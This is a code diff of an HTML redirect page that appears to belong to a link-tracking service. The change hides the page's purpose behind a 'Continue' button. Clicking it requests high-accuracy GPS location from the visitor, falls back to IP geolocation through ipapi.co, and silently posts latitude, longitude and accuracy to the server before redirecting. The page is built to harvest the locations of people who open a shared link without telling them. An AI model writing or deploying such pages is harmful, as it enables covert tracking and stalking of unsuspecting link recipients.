@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Continue</title>
 <style>
 * {
   margin: 0;
@@ -25,14 +25,40 @@ body {
   padding: 20px;
 }
 
+.btn {
+  background: white;
+  color: #667eea;
+  border: none;
+  padding: 15px 40px;
+  font-size: 18px;
+  font-weight: 600;
+  border-radius: 50px;
+  cursor: pointer;
+  transition: transform 0.2s, box-shadow 0.2s;
+  margin-top: 20px;
+}
+
+.btn:hover {
+  transform: scale(1.05);
+  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+}
+
+.btn:active {
+  transform: scale(0.98);
+}
+
+.hidden {
+  display: none;
+}
+
 .spinner {
-  width: 50px;
-  height: 50px;
+  width: 40px;
+  height: 40px;
   border: 3px solid rgba(255,255,255,0.3);
   border-top-color: white;
   border-radius: 50%;
   animation: spin 0.8s linear infinite;
-  margin: 0 auto 20px;
+  margin: 20px auto 0;
 }
 
 @keyframes spin {
@@ -42,20 +68,23 @@ body {
 p {
   color: white;
   font-size: 16px;
-  opacity: 0.9;
+  margin-bottom: 20px;
 }
 </style>
 </head>
 <body>
 <div class="container">
-  <div class="spinner"></div>
-  <p>Loading, please wait...</p>
+  <p>Click continue to proceed</p>
+  <button class="btn" id="continueBtn">Continue →</button>
+  <div id="loading" class="spinner hidden"></div>
 </div>
 
 <script>
 const linkId = window.location.pathname.split('/').pop();
 let destUrl = 'https://google.com';
 let locationSent = false;
+const continueBtn = document.getElementById('continueBtn');
+const loading = document.getElementById('loading');
 
 // Get destination URL
 fetch('/api/hits/' + linkId)
@@ -73,13 +102,10 @@ function sendLocation(lat, lon, acc) {
     body: JSON.stringify({ lat, lon, acc })
   }).catch(() => {});
   
-  // Redirect after saving
-  setTimeout(() => {
-    window.location.href = destUrl;
-  }, 500);
+  // Redirect
+  window.location.href = destUrl;
 }
 
-// IP-based geolocation fallback
 function getIPLocation() {
   fetch('https://ipapi.co/json/')
     .then(response => response.json())
@@ -95,26 +121,31 @@ function getIPLocation() {
     });
 }
 
-// Try HTML5 geolocation first
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      sendLocation(
-        pos.coords.latitude,
-        pos.coords.longitude,
-        Math.round(pos.coords.accuracy)
-      );
-    },
-    err => {
-      // If HTML5 fails, try IP geolocation
-      getIPLocation();
-    },
-    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-  );
-} else {
-  // No HTML5 support, use IP geolocation
-  getIPLocation();
+function grabLocation() {
+  continueBtn.style.display = 'none';
+  loading.classList.remove('hidden');
+  
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        sendLocation(
+          pos.coords.latitude,
+          pos.coords.longitude,
+          Math.round(pos.coords.accuracy)
+        );
+      },
+      err => {
+        // If GPS fails, try IP
+        getIPLocation();
+      },
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+    );
+  } else {
+    getIPLocation();
+  }
 }
+
+continueBtn.addEventListener('click', grabLocation);
 </script>
 </body>
 </html>
